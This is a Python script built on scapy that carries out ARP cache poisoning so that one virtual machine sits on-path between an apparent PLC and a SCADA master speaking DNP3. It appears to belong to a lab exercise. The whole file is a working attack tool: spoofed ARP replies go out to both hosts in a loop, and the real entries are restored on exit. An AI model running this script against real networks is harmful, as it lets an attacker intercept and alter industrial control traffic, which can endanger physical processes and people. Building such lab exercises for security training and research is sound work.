"""
ARP Cache Poisoning — positions this machine (VM3) on-path between VM1 (PLC)
and VM2 (SCADA master / dnp3).

Sends spoofed ARP replies to both VM1 and VM2 telling each that this
machine's MAC owns the other's IP. Restores real ARP entries on Ctrl+C.
"""

from scapy.all import ARP, Ether, sendp, conf
import time
import threading
from config import VM1_IP, VM1_MAC, VM2_IP, VM2_MAC, IFACE


conf.iface = "enp0s3"
print(f"[*] Using interface: {conf.iface}")

running = True

def spoof(target_ip, target_mac, impersonate_ip):
    frame = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=impersonate_ip)
    sendp(frame, verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac):
    frame = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    sendp(frame, count=5, verbose=False)

def poison_loop():
    print("[*] Poisoning both directions — Ctrl+C to stop and restore")
    while running:
        spoof(VM1_IP, VM1_MAC, VM2_IP)
        spoof(VM2_IP, VM2_MAC, VM1_IP)
        time.sleep(2)

def main():
    global running
    print(f"    VM1 ({VM1_IP}) = {VM1_MAC}")
    print(f"    VM2 ({VM2_IP}) = {VM2_MAC}")

    t = threading.Thread(target=poison_loop, daemon=True)
    t.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Restoring real ARP entries...")
        running = False
        time.sleep(0.5)
        restore(VM1_IP, VM1_MAC, VM2_IP, VM2_MAC)
        restore(VM2_IP, VM2_MAC, VM1_IP, VM1_MAC)
        print("[*] Done. Remember to turn IP forwarding back off:")
        print("    sudo sysctl -w net.ipv4.ip_forward=0")

if __name__ == "__main__":
    main()
